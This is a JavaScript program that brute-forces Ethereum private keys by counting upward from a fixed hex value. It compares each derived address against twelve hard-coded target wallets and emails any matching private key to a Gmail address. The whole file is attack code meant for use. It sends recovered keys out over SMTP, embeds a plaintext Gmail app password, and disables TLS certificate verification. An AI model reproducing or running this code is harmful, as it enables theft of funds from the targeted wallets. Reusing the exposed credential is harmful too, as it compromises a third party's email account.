const { ethers } = require("ethers");
const nodemailer = require("nodemailer");

const transporter = nodemailer.createTransport({
  host: "smtp.gmail.com",
  service: "gmail",
  port: 587,
  secure: true,
  auth: {
    user: "musoaibekay@gmail.com",
    pass: "pmvwxjvhvcujeloo",
  },
  tls: {
    rejectUnauthorized: false,
  },
});

transporter.verify((err, success) => {
  if (err) {
    console.log(err);
  } else {
    console.log("READY");
    console.log(success);
  }
});

const sendEmail = async (subject, text) => {
  try {
    await transporter.sendMail({
      from: "musoaibekay@gmail.com",
      to: "shaunaibek@gmail.com",
      subject: `Key For ${subject}`,
      text: `The Private Key = ${text}`,
    });
  } catch (error) {
    console.log(error);
  }
};

const MAX_VALUE = "f".repeat(64);

function incrementHex(hexString) {
  const decimalValue = BigInt(`0x${hexString}`);
  const nextValue = (decimalValue + 1n) % BigInt(`0x${MAX_VALUE}`);
  return nextValue.toString(16).padStart(64, "0");
}

let currentHex =
  "0000000000000000000000000000000000000000000000000000000029dcd2bc";

const targetAddress = "0x2eFB50e952580f4ff32D8d2122853432bbF2E204";
const target2 = "0xa26e73C8E9507D50bF808B7A2CA9D5dE4fcC4A04";
const target3 = "0x6081258689a75d253d87cE902A8de3887239Fe80";
const target4 = "0x4F86C2F941aA8D6d5eB0368B60e3358CC0F33317";
const target5 = "0xC480EF5F0c8Ef319f7F14ac6036249E5876Ac19f";
const target6 = "0xA60D8583Ce836c260D70F987D1dD00DbFBCD3631";
const target7 = "0x874b27aE884204b3169721f5d441aeebB373fD7E";
const target8 = "0x6A9ee69B6781C18164ee9F7C58f1763BcFfC7c51";
const target9 = "0xfc98DfFc22767872992789710DB003e588AA40F8";
const target10 = "0xc678Cb68f6431b58ba7ab5146166C1bff8E99727";
const target11 = "0x183A6cF1Fc6504138d92C9d663094EE774f80038";
const target12 = "0x41BF0bb2fCbEfAe9504c1CFCBd9A20987064EE90";

function getAddressFromPrivateKey(privateKey) {
  const wallet = new ethers.Wallet(privateKey);
  return wallet.address;
}
function startIncrementing() {
  console.log(currentHex);

  // Increment the current hex value
  currentHex = incrementHex(currentHex);

  // Schedule the next increment after a delay (adjust the delay as needed)
  setTimeout(startIncrementing, 1);
}

async function findMatchingAddress() {
  let found = false;
  // Start the incrementing process
  startIncrementing();

  while (!found) {
    const address = getAddressFromPrivateKey(currentHex);
    // fs.appendFile("stop.txt", currentHex + "\n", (err) => {
    //   if (err) {
    //     console.log(err);
    //   }
    // });

    console.log("Generated Private Key:", currentHex);
    console.log("Corresponding Address:", address);

    if (address.toLowerCase() === targetAddress.toLowerCase()) {
      await sendEmail("target 1", currentHex);
      console.log("Match found!");
      found = true;
    } else if (address.toLowerCase() === target2.toLowerCase()) {
      await sendEmail("target 2", currentHex);
    } else if (address.toLowerCase() === target3.toLowerCase()) {
      await sendEmail("target 3", currentHex);
    } else if (address.toLowerCase() === target4.toLowerCase()) {
      await sendEmail("target 4", currentHex);
    } else if (address.toLowerCase() === target5.toLowerCase()) {
      await sendEmail("target 5", currentHex);
    } else if (address.toLowerCase() === target6.toLowerCase()) {
      await sendEmail("target 6", currentHex);
    } else if (address.toLowerCase() === target7.toLowerCase()) {
      await sendEmail("target 7", currentHex);
    } else if (address.toLowerCase() === target8.toLowerCase()) {
      await sendEmail("target 8", currentHex);
    } else if (address.toLowerCase() === target9.toLowerCase()) {
      await sendEmail("target 9", currentHex);
    } else if (address.toLowerCase() === target10.toLowerCase()) {
      await sendEmail("target 10", currentHex);
    } else if (address.toLowerCase() === target11.toLowerCase()) {
      await sendEmail("target 11", currentHex);
    } else if (address.toLowerCase() === target12.toLowerCase()) {
      await sendEmail("target 12", currentHex);
      // const content = "Private Key" + currentHex;
      // fs.appendFile("target12.txt", content, (err) => {
      //   if (err) {
      //     console.log(err);
      //   }
      // });
    }

    // Add a delay or throttle to avoid overwhelming the network
    await new Promise((resolve) => setTimeout(resolve, 1));
  }
}

findMatchingAddress();
